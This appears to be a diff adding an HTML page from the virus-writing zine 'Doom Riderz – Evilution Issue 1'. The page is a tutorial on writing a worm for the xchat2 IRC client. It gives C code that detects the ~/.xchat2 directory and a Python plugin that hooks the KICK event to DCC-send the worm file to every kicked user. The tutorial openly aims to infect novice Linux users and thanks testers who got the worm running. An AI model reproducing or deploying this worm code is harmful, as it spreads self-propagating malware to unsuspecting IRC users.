@@ -1,0 +1,161 @@
+<html>
+<head>
+<title>Doom Riderz - Evilution Issue 1</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link rel="stylesheet" type="text/css" href="../doom.css">
+<script type="text/javascript" src="../fader.js"></script>
+</head>
+<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<br>
+<div id="viewerText">
+<div id="viewerTextHeader"><a href="#">Writing irc worms for xchat2 by wargame</a></div>
+<pre>
+               +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+               ++++           Writing irc worms for xchat2            ++++
+               +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+1) Introduction
+2) How to locate xchat2 on the system
+3) The code
+4) Greetz
+
+
+1) Introduction
+
+   Linux and other open sources systems are becoming very widespreaded, today
+   those systems are not only used on the server side but also on the desktop
+   side.
+   There are many n00b linux user around that can be fucked by many tricks
+   that have been used for windows.
+   This small guide wants to demonstrate how a small "mirc-like" worm can be 
+   written for a notorious unix irc client called xchat.
+   Powerful linux malwares are very difficult to write, its security model is
+   very robust so I think we will never see a serious threat for the open source
+   systems.
+   All the things written here have been tested using xchat2.
+   Ok no other words and remember: my main language is italian so this
+   guide could contain grammar mistakes !
+
+
+2) How to locate xchat2 on the system
+
+   You can use two simple way to see if xchat2 program is installed on the 
+   system:
+   
+   a) Look for the xchat executable in /usr/bin and /usr/local/bin
+   b) (Better way) Check if the directory /$HOME/.xchat2 exists 
+
+   I suggest you to use the way b, because it could happen that an user has
+   xchat but he/she has never started it.    
+
+   Small code snippet:
+   
+   -- FindXchat.c --
+   
+	#include &lt;stdio.h&gt;
+	#include &lt;stdlib.h&gt;
+
+	int main(int argc,char *argv[])
+	{
+	    char xchat2_dir[256];
+	    char *home = getenv("HOME");
+	    
+	    if(home != NULL)
+	    {
+	        sprintf(xchat2_dir,"%s/.xchat2",home);
+	        
+	        if(chdir(xchat2_dir) &lt; 0)
+	        {
+	            printf("xchat2 is not present\n");
+	        }
+	        
+	        else
+	        {
+	            printf("xchat2 is present\n");
+	        }
+	        
+	    }
+	    
+	    else
+	    {
+	        printf("I could not get $HOME!\n");
+	    }
+	    
+	}
+   -------EOF-------
+
+3) The code
+
+   After finding the xchat2's dir we should put our script in it.
+   xchat2 has a very good plugins interface, you can add your own functions
+   to the client with few lines of code.
+   This plugin interface supports several languages: C,C++,python,perl and 
+   maybe others in the future.
+   I will use the python interface for this guide but everything explained  
+   can be applied to the other languages.
+   The "traditional" irc script worm uses some events to be activated 
+   usually "JOIN" (when an user enters a channel you are), I hate tradition
+   so I will use the "KICK" event.
+   This small python script should be simple to understand.
+
+   -- xchat2worm.py --
+
+   __module_name__ = "xchat2worm"
+   __module_version__ = "0.1"
+   __module_description__ = "xchat2worm by [WarGame/doomriderz]"
+   import xchat
+   def onkick_cb(word, word_eol, userdata):
+   	if xchat.nickcmp(word[3],xchat.get_info("nick")) != 0:
+		xchat.command("DCC SEND " + word[3] + " path_of_my_worm")
+   	return xchat.EAT_NONE 
+   xchat.hook_server("KICK", onkick_cb)
+
+   --------EOF--------
+
+   I think the code is quite simple, we define a callback function called 
+   "onkick_cb", this will be called when the KICK event occurs.
+   To hook the event we will use xchat.hook_server(), it takes two args,
+   the name of the event (like "JOIN" or "NOTICE") and the callback that has
+   to handle it.
+   A callback function has always the same parameters:
+   
+   word <-- an array, very important 
+   word_eol <-- an other array, important too
+   userdata <-- user defined values 
+
+   You should use word and word_eol in the callback because they contain
+   important data like nicks, channels name etc ...
+   In my case the word array contains all the infos I need, infact word[3] 
+   contains the nick of the asshole that has been kicked.
+   Then I use xchat.nickcmp() to be sure I do not send the worm to myself
+   ( to get infos about yourself use xchat.getinfo() ), now I can do the 
+   real stuff using xchat.command().
+   I build a string like "DCC SEND nick path_of_file_to_send" and pass it
+   to this function so it gets executed.
+   Remember to return from callback one of the predefined values (taken from
+   guide):
+
+   EAT_PLUGIN <-- Don't let any other plugin receive this event. 
+   EAT_XCHAT <-- Don't let xchat treat this event as usual. 
+   EAT_ALL <-- Eat the event completely. 
+   EAT_NONE <-- Let everything happen as usual.
+
+   I suggest you to use EAT_NONE so everything is handled by xchat itself.
+   You can now create your own scripts and use other events :)
+
+4) Greetz
+
+   greetz to all doomriderz, EOF-project, slagehammer and all people on
+   #vx-lab, #eof-project,#virus
+   In particular:
+   
+   Retr0 -- thx a lot for testing dude :)
+   Necronomikon -- at the end you got my worm working on your system, thx :)
+
+   As usual if you want to contact me drop a mail to wargame89@yahoo.it
+   or come on undernet. In this zine you will find a small ASM shit that will do all this.
+   I hope you enjoyed reading this guide, Bye :)
+</pre>
+</div>
+</body>
+</html>
